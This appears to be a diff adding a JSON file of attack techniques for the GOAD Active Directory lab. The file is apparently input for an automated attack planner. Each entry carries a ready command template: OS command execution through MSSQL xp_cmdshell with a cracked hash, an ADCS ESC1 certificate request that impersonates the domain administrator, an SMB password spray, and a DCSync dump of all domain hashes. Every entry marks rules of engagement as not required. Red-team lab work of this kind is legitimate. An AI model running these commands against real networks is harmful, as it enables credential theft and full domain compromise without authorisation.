@@ -1,0 +1,104 @@
+[
+  {
+    "uuid": "goad-initacc-t1190-mssql-0",
+    "name": "mssql_xp_cmdshell",
+    "mitre_technique": "T1190",
+    "mitre_tactic": "TA0001",
+    "description": "Connect to MSSQL via impacket-mssqlclient using cracked sql_svc NT hash and execute OS commands via xp_cmdshell stored procedure",
+    "source": "GOAD lab + impacket-mssqlclient",
+    "command_template": "impacket-mssqlclient {domain}/sql_svc@192.168.56.22 -hashes :{sql_svc_hash} -windows-auth -db master -query \"EXEC xp_cmdshell 'whoami'\" 2>&1",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": ["mssql"],
+      "required_files": [],
+      "required_credentials": ["sql_svc_nthash"],
+      "required_access": "network",
+      "additional": ["mssql_xp_cmdshell_enabled", "sql_svc_hash_cracked"]
+    },
+    "effects": {
+      "grants_access": "mssql_shell"
+    },
+    "cost": 0.35,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-cred-t1649-adcs-esc1-0",
+    "name": "certipy_adcs_esc1",
+    "mitre_technique": "T1649",
+    "mitre_tactic": "TA0006",
+    "description": "Request a domain admin certificate via ADCS ESC1 misconfiguration using certipy, impersonating administrator@domain with a vulnerable certificate template",
+    "source": "GOAD lab + certipy",
+    "command_template": "certipy req -u {kerberoast_user}@{domain} -p {kerberoast_pass} -ca 'north-WINTERFELL-CA' -template 'ESC1' -upn 'administrator@{domain}' -dc-ip {dc_ip} -out /tmp/administrator.pfx 2>&1",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": ["ldap", "http"],
+      "required_files": [],
+      "required_credentials": ["domain_user_password"],
+      "required_access": "network",
+      "additional": ["adcs_esc1_template_misconfigured", "certipy_installed"]
+    },
+    "effects": {
+      "grants_access": "domain_admin_cert",
+      "creates_artifact": "administrator_pfx"
+    },
+    "cost": 0.25,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-initacc-t1110003-spray-0",
+    "name": "crackmapexec_password_spray",
+    "mitre_technique": "T1110.003",
+    "mitre_tactic": "TA0006",
+    "description": "Spray a single password against a list of domain usernames over SMB using crackmapexec or netexec to identify valid credential pairs",
+    "source": "GOAD lab + crackmapexec",
+    "command_template": "crackmapexec smb {dc_ip} -u /tmp/userlist.txt -p '{kerberoast_pass}' --continue-on-success 2>&1 | grep '+' || nxc smb {dc_ip} -u /tmp/userlist.txt -p '{kerberoast_pass}' --continue-on-success 2>&1 | grep '+'",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "none",
+      "required_services": ["smb"],
+      "required_files": ["/tmp/userlist.txt"],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["domain_userlist_available"]
+    },
+    "effects": {
+      "grants_access": "domain_user_creds"
+    },
+    "cost": 0.3,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-cred-t1003006-dcsync-0",
+    "name": "secretsdump_dcsync",
+    "mitre_technique": "T1003.006",
+    "mitre_tactic": "TA0006",
+    "description": "Perform DCSync attack using impacket-secretsdump to replicate all domain credential hashes from the domain controller, dumping NTDS in one operation",
+    "source": "GOAD lab + impacket-secretsdump",
+    "command_template": "impacket-secretsdump -just-dc {domain}/{username}:{password}@{dc_ip} 2>&1 | head -30",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "domain_admin",
+      "required_services": ["ldap", "smb"],
+      "required_files": [],
+      "required_credentials": ["domain_admin_password"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "all_domain_hashes",
+      "creates_artifact": "ntds_dump"
+    },
+    "cost": 0.15,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-lab-v1", "confidence": 1.0}
+  }
+]
